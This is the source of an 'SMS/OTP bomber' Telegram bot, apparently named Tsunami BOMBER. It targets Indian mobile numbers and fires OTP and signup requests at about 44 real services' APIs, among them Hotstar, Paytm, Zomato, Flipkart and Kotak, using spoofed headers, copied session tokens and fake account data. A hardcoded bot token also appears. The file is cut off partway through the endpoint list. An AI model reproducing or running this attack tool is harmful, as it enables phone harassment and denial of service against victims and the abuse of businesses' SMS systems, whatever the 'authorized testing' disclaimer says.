"""
Tsunami BOMBER — ULTRA FAST LIVE EDITION
- Auto health-check (only live endpoints used)
- Smart rotation (no endpoint repeated within 5s)
- Carrier-aware throttling (maximize actual delivery)
- All 61 original + 20 new 2024 endpoints
?? Authorized testing only. Misuse illegal.
"""
import os, sys, time, asyncio, logging, random
from typing import Optional
from collections import defaultdict

import aiohttp
from telegram import Update, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "9160551324:AAGsDDQxM0i-G_c9z5x6Cmt1N3bXbHyUPsw")
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))
CONCURRENCY     = int(os.environ.get("CONCURRENCY", 15))
DELAY           = float(os.environ.get("DELAY", 0.02))
REQUEST_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", 6))
SESSION_MAX_MIN = int(os.environ.get("SESSION_MAX_MIN", 30))
MIN_GAP_PER_ENDPOINT = float(os.environ.get("MIN_GAP", 3.0))  # sec gap per endpoint
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

# Runtime tracking
LIVE_ENDPOINTS: list = []
ENDPOINT_LAST_HIT: dict = defaultdict(float)   # endpoint name -> last hit time
ENDPOINT_SUCCESS: dict = defaultdict(int)
ENDPOINT_FAIL: dict = defaultdict(int)
HEALTH_DONE = False


def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"


# =========================================================================
#  ALL 61 ORIGINAL + 20 NEW ENDPOINTS
# =========================================================================
def build_endpoints():
    UA_C = ("Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/85.0.4183.101 Mobile Safari/537.36")
    UA_O = ("Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 "
            "Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) "
            "Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 "
            "OppoBrowser/2.2.5")
    UA_C2 = ("Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/85.0.4183.127 Mobile Safari/537.36")
    UA_OLD = ("Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/55.0.2883.91 Mobile Safari/537.36")

    E = []

    # ---------- 1. Hotstar ----------
    E.append({"name":"Hotstar","method":"PUT",
      "url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
      "headers":{"Host":"api.hotstar.com",
        "x-hs-usertoken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
        "user-agent":UA_C,"content-type":"application/json",
        "x-hs-platform":"PCTV","x-country-code":"IN",
        "x-hs-device-id":"faa88f05-7432-4103-9886-7bd934f5c3a1",
        "hotstarauth":"st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
        "x-hs-appversion":"5.0.40",
        "accept":"*/*","origin":"https://www.hotstar.com",
        "referer":"https://www.hotstar.com/in/subscribe/sign-in"},
      "data":'{"phone_number":"{t}","country_prefix":"91"}'})

    # ---------- 2. AltBalaji ----------
    E.append({"name":"AltBalaji","method":"POST",
      "url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
      "headers":{"Host":"api.cloud.altbalaji.com",
        "Accept":"application/json, text/plain, */*","User-Agent":UA_C,
        "X-API-KEY":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
        "Content-Type":"application/json","Origin":"https://www.altbalaji.com",
        "Referer":"https://www.altbalaji.com/user-detail?pid=NTU%3D"},
      "data":'{"phone_number":"{t}","country_code":"91","platform":"web","exp":1601043289127}'})

    # ---------- 3. Voot ----------
    E.append({"name":"Voot","method":"POST",
      "url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
      "headers":{"Host":"us-central1-vootdev.cloudfunctions.net",
        "accept":"application/json, text/plain, */*","user-agent":UA_C,
        "content-type":"application/json;charset=UTF-8",
        "origin":"https://www.voot.com","referer":"https://www.voot.com/"},
      "data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})

    # ---------- 4. SonyLIV ----------
    E.append({"name":"SonyLIV","method":"POST",
      "url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
      "headers":{"Host":"apiv2.sonyliv.com",
        "device_id":"5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
        "security_token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
        "user-agent":UA_C,"content-type":"application/json",
        "accept":"application/json, text/plain, */*",
        "session_id":"cc86326a51504133bacd3ce4f796e1cf-1600956156256",
        "x-via-device":"true","app_version":"3.1.20",
        "origin":"https://www.sonyliv.com"},
      "data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}'})

    # ---------- 5. MedPlus ----------
    E.append({"name":"MedPlus","method":"POST",
      "url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
      "headers":{"Host":"mobile.medplusindia.com",
        "accept":"application/json, text/plain, */*","user-agent":UA_C,
        "content-type":"application/x-www-form-urlencoded",
        "origin":"https://www.medplusmart.com"},
      "data":"recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={t}&SESSIONID=18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW&isCordova=false&isPhonepeSwitch=false"})

    # ---------- 6. Apollo247 ----------
    E.append({"name":"Apollo247","method":"POST",
      "url":"https://webapi.apollo247.com/",
      "headers":{"Host":"webapi.apollo247.com","accept":"*/*",
        "Authorization":"Bearer 18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW",
        "User-Agent":UA_C,"content-type":"application/json",
        "Origin":"https://www.apollo247.com",
        "Referer":"https://www.apollo247.com/medicines"},
      "data":'{"operationName":"Login","variables":{"mobileNumber":"+91{t}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\nstatus\\nmessage\\nloginId\\n__typename\\n  }\\n}\\n"}'})

    # ---------- 7. NetMeds ----------
    E.append({"name":"NetMeds","method":"GET",
      "url":"https://m.netmeds.com/mst/rest/v1/id/details/{t}",
      "headers":{"Host":"m.netmeds.com",
        "accept":"application/json, text/plain, */*","user-agent":UA_C,
        "referer":"https://m.netmeds.com/customer/account/login"},
      "data":None})

    # ---------- 8. InstaCash ----------
    E.append({"name":"InstaCash","method":"POST",
      "url":"https://getinstacash.in/sell/getData.php",
      "headers":{"Host":"getinstacash.in","Accept":"*/*",
        "X-Requested-With":"XMLHttpRequest","User-Agent":UA_C,
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Origin":"https://getinstacash.in",
        "Referer":"https://getinstacash.in/sell/login"},
      "data":"type=sendOTP&mobile={t}"})

    # ---------- 9. FBBOnline ----------
    E.append({"name":"FBBOnline","method":"POST",
      "url":"https://www.fbbonline.in/customer/account/GenerateOtp",
      "headers":{"Host":"www.fbbonline.in",
        "accept":"application/json, text/javascript, */*; q=0.01",
        "X-Requested-With":"XMLHttpRequest","user-agent":UA_C,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "origin":"https://www.fbbonline.in",
        "referer":"https://www.fbbonline.in/customer/account/create"},
      "data":"YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={t}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="})

    # ---------- 10. Grofers ----------
    E.append({"name":"Grofers","method":"POST",
      "url":"https://grofers.com/v2/accounts/",
      "headers":{"Host":"grofers.com",
        "device_id":"a11f656b-422e-4617-953b-c350d517467d",
        "user-agent":UA_C,
        "auth_key":"57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
        "app_client":"consumer_web",
        "content-type":"application/x-www-form-urlencoded",
        "origin":"https://grofers.com","referer":"https://grofers.com/"},
      "data":"user_phone={t}"})

    # ---------- 11. Snapdeal ----------
    E.append({"name":"Snapdeal","method":"POST",
      "url":"https://m.snapdeal.com/signupCompleteAjax",
      "headers":{"Host":"m.snapdeal.com","user-agent":UA_C,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "origin":"https://m.snapdeal.com",
        "referer":"https://m.snapdeal.com/signin"},
      "data":"j_password=null&j_mobilenumber={t}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"})

    # ---------- 12. Zomato ----------
    E.append({"name":"Zomato","method":"POST",
      "url":"https://www.zomato.com/webroutes/auth/login",
      "headers":{"Host":"www.zomato.com",
        "x-zomato-csrft":"a6b0c09972b2bdd30c9c1b6552caee5d",
        "user-agent":UA_C,"content-type":"application/json","accept":"*/*",
        "origin":"https://www.zomato.com",
        "referer":"https://www.zomato.com/kanpur"},
      "data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})

    # ---------- 13. Cuemath ----------
    E.append({"name":"Cuemath","method":"POST",
      "url":"https://www.cuemath.com/api/v4/parents/",
      "headers":{"Host":"www.cuemath.com","User-Agent":UA_C,
        "Content-Type":"application/JSON","Accept":"*/*",
        "Origin":"https://www.cuemath.com",
        "Referer":"https://www.cuemath.com/the-ultimate-cuemath-olympiad/"},
      "data":'{"intl_mobile":{"phone":""},"phone":"{t}","email":"nsbd@dn.djs","full_name":"hdhdhdg","place_id":"ChIJYYhT3gl3AjoRUDlkL1i5oIk","timezone":"Asia/Calcutta","detail_source":"CMO_2020","form_fields":"full_name,phone,email,place_id"}'})

    # ---------- 14. Dream11 ----------
    E.append({"name":"Dream11","method":"POST",
      "url":"https://www.dream11.com/graphql/mutation/pwa/register",
      "headers":{"Host":"www.dream11.com","accept":"*/*","device":"pwa",
        "x-csrf":"fb1f1947-4547-392d-9a28-a9de30d9e766","user-agent":UA_C,
        "content-type":"application/json","origin":"https://www.dream11.com",
        "referer":"https://www.dream11.com/register?ru="},
      "data":'{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"{t}","password":"tsunami@123astronomia"}}'})

    # ---------- 15. Doubtnut ----------
    E.append({"name":"Doubtnut","method":"POST",
      "url":"https://doubtnut.com/api/v1/user/login",
      "headers":{"Host":"doubtnut.com","user-agent":UA_C,
        "content-type":"application/x-www-form-urlencoded","accept":"*/*",
        "origin":"https://doubtnut.com","referer":"https://doubtnut.com/login"},
      "data":"phone={t}"})

    # ---------- 16. Vedantu ----------
    E.append({"name":"Vedantu","method":"POST",
      "url":"https://user.vedantu.com/user/preLoginVerification",
      "headers":{"Host":"user.vedantu.com","user-agent":UA_C,
        "content-type":"application/json","accept":"*/*",
        "origin":"https://www.vedantu.com",
        "referer":"https://www.vedantu.com/masterclass"},
      "data":'{"email":null,"phoneCode":"+91","phoneNumber":"{t}","ver":"11.345"}'})

    # ---------- 17. Unacademy ----------
    E.append({"name":"Unacademy","method":"POST",
      "url":"https://unacademy.com/api/v3/user/user_check/",
      "headers":{"Host":"unacademy.com","accept":"*/*",
        "authorization":"Bearer undefined","user-agent":UA_C,
        "content-type":"application/json","origin":"https://unacademy.com",
        "referer":"https://unacademy.com/login"},
      "data":'{"phone":"{t}","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}'})

    # ---------- 18. Byju's ----------
    E.append({"name":"Byjus","method":"POST",
      "url":"https://bcas-prod.byjusweb.com/api/send-otp",
      "headers":{"Host":"bcas-prod.byjusweb.com","accept":"*/*",
        "origin":"https://byjus.com","user-agent":UA_O,
        "content-type":"application/x-www-form-urlencoded",
        "referer":"https://byjus.com/byjus-classes-book-a-free-demo-class/"},
      "data":"phoneNumber={t}&page=free-trial-classes"})

    # ---------- 19. RedBus ----------
    E.append({"name":"RedBus","method":"GET",
      "url":"https://m.redbus.in/api/getOtp?number={t}&cc=91&whatsAppOpted=undefined",
      "headers":{"Host":"m.redbus.in",
        "accept":"application/json, text/plain, */*","user-agent":UA_C,
        "referer":"https://m.redbus.in/preregister"},
      "data":None})

    # ---------- 20. Careers360 ----------
    E.append({"name":"Careers360","method":"POST",
      "url":"https://www.careers360.com/ajax/no-cache/user/otp-send",
      "headers":{"Host":"www.careers360.com","Accept":"*/*",
        "X-Requested-With":"XMLHttpRequest","User-Agent":UA_C2,
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Origin":"https://www.careers360.com",
        "Referer":"https://www.careers360.com/user/otp-verify/"},
      "data":"mobile_number={t}&method=call&uid=12692588"})

    # ---------- 21. Coolwinks ----------
    E.append({"name":"Coolwinks","method":"GET",
      "url":"https://api.coolwinks.com/api/accounts/is_already_registered/?username={t}",
      "headers":{"Host":"api.coolwinks.com","Accept":"*/*",
        "x-user-agent":UA_C2+" CWUA/msite/0/","User-Agent":UA_C2,
        "Origin":"https://www.coolwinks.com",
        "Referer":"https://www.coolwinks.com/"},
      "data":None})

    # ---------- 22. Cansell ----------
    E.append({"name":"Cansell","method":"POST",
      "url":"https://webapi.cansell.in/api/User/SignUp",
      "headers":{"Host":"webapi.cansell.in",
        "Accept":"application/json, text/plain, */*","User-Agent":UA_C2,
        "Content-Type":"application/json;charset=UTF-8",
        "Origin":"https://m.cansell.in","Referer":"https://m.cansell.in/register"},
      "data":'{"name":"Uwusjsj","surname":"wjeshs","email":"hsjs@gmail.com","phone":"{t}","password":"eeeeee"}'})

    # ---------- 23. Gaana ----------
    E.append({"name":"Gaana","method":"POST",
      "url":"https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
      "headers":{"appVersion":"8.9.0","channel":"gaana.com",
        "deviceId":"j9qcq0z2ur4llq2a58qqmag2","platform":"android",
        "Content-Type":"application/json; charset=utf-8",
        "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
        "Host":"jsso1.indiatimes.com"},
      "data":'{"mobile":"+91-{t}"}'})

    # ---------- 24. Flipkart ----------
    E.append({"name":"Flipkart","method":"POST",
      "url":"https://1.rome.api.flipkart.com/1/action/view",
      "headers":{"Host":"1.rome.api.flipkart.com",
        "x-user-agent":UA_O+"FKUA/msite/0.0.3/msite/Mobile",
        "Origin":"https://www.flipkart.com","User-Agent":UA_O,
        "content-type":"application/json","Accept":"*/*",
        "Referer":"https://www.flipkart.com/login"},
      "data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","clientQueryParamMap":{"ret":"/?affid=siteplug","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'})

    # ---------- 25. Ullu ----------
    E.append({"name":"Ullu","method":"POST",
      "url":"https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={t}",
      "headers":{"Host":"ullu.app",
        "accept":"application/json, text/plain, */*",
        "origin":"https://ullu.app","user-agent":UA_O,
        "referer":"https://ullu.app/"},
      "data":""})

    # ---------- 26. Paytm ----------
    E.append({"name":"Paytm","method":"POST",
      "url":"https://accounts.paytm.com/v2/api/register",
      "headers":{"Host":"accounts.paytm.com",
        "Accept":"application/json, text/plain, */*",
        "Origin":"https://accounts.paytm.com","User-Agent":UA_O,
        "Content-Type":"application/json",
        "Referer":"https://accounts.paytm.com/oauth2/authorize"},
      "data":'{"email":"","mobile":"{t}","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'})

    # ---------- 27. OGonn ----------
    E.append({"name":"OGonn","method":"POST",
      "url":"https://ogonn.in/otp",
      "headers":{"Host":"ogonn.in",
        "accept":"application/json, text/javascript, */*; q=0.01",
        "origin":"https://ogonn.in","x-requested-with":"XMLHttpRequest",
        "user-agent":UA_O,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "referer":"https://ogonn.in/login"},
      "data":"_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={t}"})

    # ---------- 28. Aakash Mkt ----------
    E.append({"name":"AakashMkt","method":"POST",
      "url":"https://digital.aakash.ac.in/mkt-signup-otp-verify",
      "headers":{"Host":"digital.aakash.ac.in","accept":"*/*",
        "origin":"https://digital.aakash.ac.in","x-requested-with":"XMLHttpRequest",
        "user-agent":UA_O,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "referer":"https://digital.aakash.ac.in/online-courses"},
      "data":"&mobileval={t}&otp=6230"})

    # ---------- 29. Swiggy ----------
    E.append({"name":"Swiggy","method":"POST",
      "url":"https://www.swiggy.com/mapi/auth/signup",
      "headers":{"Host":"www.swiggy.com","origin":"https://www.swiggy.com",
        "user-agent":UA_O,"content-type":"application/json","accept":"*/*",
        "referer":"https://www.swiggy.com/auth/register"},
      "data":'{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{t}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}'})

    # ---------- 30. LimeRoad ----------
    E.append({"name":"LimeRoad","method":"POST",
      "url":"https://www.limeroad.com/auth/get_uuid_v2?ajax=true",
      "headers":{"Host":"www.limeroad.com","origin":"https://www.limeroad.com",
        "user-agent":UA_O,"content-type":"application/x-www-form-urlencoded",
        "accept":"*/*",
        "referer":"https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men"},
      "data":"utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={t}"})

    # ---------- 31. Cilory ----------
    E.append({"name":"Cilory","method":"POST",
      "url":"https://www.cilory.com/app/w/auth/soft",
      "headers":{"Host":"www.cilory.com","accept":"application/json",
        "origin":"https://www.cilory.com","user-agent":UA_O,
        "content-type":"application/json;charset=UTF-8",
        "referer":"https://www.cilory.com/authentication?back=%2Fmy-account"},
      "data":'{"mobile":"{t}"}'})

    # ---------- 32. Ajio accountCheck ----------
    E.append({"name":"AjioCheck","method":"POST",
      "url":"https://login.web.ajio.com/api/auth/accountCheck",
      "headers":{"Host":"login.web.ajio.com","accept":"application/json",
        "Origin":"https://www.ajio.com","User-Agent":UA_O,
        "content-type":"application/json",
        "Referer":"https://www.ajio.com/signup?referrer=/my-account/"},
      "data":'{"emailId":"tsunami@gmail.com"}'})

    # ---------- 33. Ajio OTP ----------
    E.append({"name":"AjioOTP","method":"POST",
      "url":"https://login.web.ajio.com/api/auth/signupSendOTP",
      "headers":{"Host":"login.web.ajio.com","accept":"application/json",
        "Origin":"https://www.ajio.com","User-Agent":UA_O,
        "content-type":"application/json",
        "Referer":"https://www.ajio.com/signup?referrer=/my-account/"},
      "data":'{"firstName":"Tsunami Bomber","login":"tsunami@gmail.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"{t}","requestType":"SENDOTP"}'})

    # ---------- 34. Aakash Signup ----------
    E.append({"name":"AakashSignup","method":"POST",
      "url":"https://digital.aakash.ac.in/signup-otp-verify",
      "headers":{"Host":"digital.aakash.ac.in","accept":"*/*",
        "origin":"https://digital.aakash.ac.in","x-requested-with":"XMLHttpRequest",
        "user-agent":UA_O,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "referer":"https://digital.aakash.ac.in/user/register"},
      "data":"&mobileval={t}"})

    # ---------- 35. BookMyShow ----------
    E.append({"name":"BookMyShow","method":"POST",
      "url":"https://in.bookmyshow.com/pwa/api/uapi/otp/send",
      "headers":{"Host":"in.bookmyshow.com","accept":"application/json",
        "user-agent":UA_C,"content-type":"application/json",
        "origin":"https://in.bookmyshow.com",
        "referer":"https://in.bookmyshow.com/login/otp"},
      "data":'{"channel":"phone","subChannel":"sms","details":{"phone":"{t}","origin":"https://in.bookmyshow.com"}}'})

    # ---------- 36. BigBasket ----------
    E.append({"name":"BigBasket","method":"POST",
      "url":"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
      "headers":{"Host":"www.bigbasket.com","accept":"application/json",
        "x-csrftoken":"gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
        "user-agent":UA_C,"x-channel":"BB-PWA",
        "content-type":"application/json","origin":"https://www.bigbasket.com",
        "referer":"https://www.bigbasket.com/auth/login/"},
      "data":'{"identifier":"{t}"}'})

    # ---------- 37. FloMattress ----------
    E.append({"name":"FloMattress","method":"POST",
      "url":"https://cod.flomattress.com/api/otp",
      "headers":{"Host":"cod.flomattress.com",
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "User-Agent":UA_C,
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Origin":"https://www.flomattress.com",
        "Referer":"https://www.flomattress.com/account/register"},
      "data":"number={t}&store=hushbedding.myshopify.com"})

    # ---------- 38. Banggood ----------
    E.append({"name":"Banggood","method":"POST",
      "url":"https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
      "headers":{"Host":"m.banggood.in","accept":"application/json",
        "x-requested-with":"XMLHttpRequest","user-agent":UA_C,
        "content-type":"application/x-www-form-urlencoded",
        "origin":"https://m.banggood.in","referer":"https://m.banggood.in/login.html"},
      "data":"mobilePhone={t}&countryPhoneCode=91&type=1&verifyCode=KmUu"})

    # ---------- 39. Lenskart ----------
    E.append({"name":"Lenskart","method":"POST",
      "url":"https://api.lenskart.com/v2/customers/sendOtp",
      "headers":{"Host":"api.lenskart.com","origin":"https://www.lenskart.com",
        "x-b3-traceid":"991600776345288","user-agent":UA_O,
        "content-type":"application/json;charset=UTF-8",
        "accept":"application/json, text/plain, */*","x-api-client":"mobilesite",
        "referer":"https://www.lenskart.com/customer/account/login"},
      "data":'{"telephone":"{t}"}'})

    # ---------- 40. UrbanClap ----------
    E.append({"name":"UrbanClap","method":"POST",
      "url":"https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
      "headers":{"Host":"www.urbanclap.com","user-agent":UA_C,
        "content-type":"application/json;charset=UTF-8",
        "accept":"application/json, text/plain, */*","x-device-os":"web",
        "x-version-name":"web_v4.137.2","origin":"https://www.urbancompany.com"},
      "data":'{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{t}"},"device_type":"customer"}'})

    # ---------- 41. Zee5 ----------
    E.append({"name":"Zee5","method":"GET",
      "url":"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={t}",
      "headers":{"Host":"b2bapi.zee5.com","Accept":"*/*","User-Agent":UA_C2,
        "Origin":"https://www.zee5.com","Referer":"https://www.zee5.com/"},
      "data":None})

    # ---------- 42. Quikr ----------
    E.append({"name":"Quikr","method":"POST",
      "url":"https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
      "headers":{"Host":"www.quikr.com","user-agent":UA_C2,
        "content-type":"application/x-www-form-urlencoded;charset=UTF-8",
        "accept":"*/*","origin":"https://www.quikr.com",
        "referer":"https://www.quikr.com/SignIn"},
      "data":"user={t}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true"})

    # ---------- 43. Kotak Save ----------
    E.append({"name":"KotakSave","method":"POST",
      "url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?flw=vkyc",
      "headers":{"Host":"www.kotak.com",
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "X-Requested-With":"XMLHttpRequest","User-Agent":UA_C2,
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Origin":"https://www.kotak.com",
        "Referer":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action"},
      "data":"cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={t}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"})

    # ---------- 44. Kotak Call ----------
    E.append({"name":"KotakCall","method":"POST",
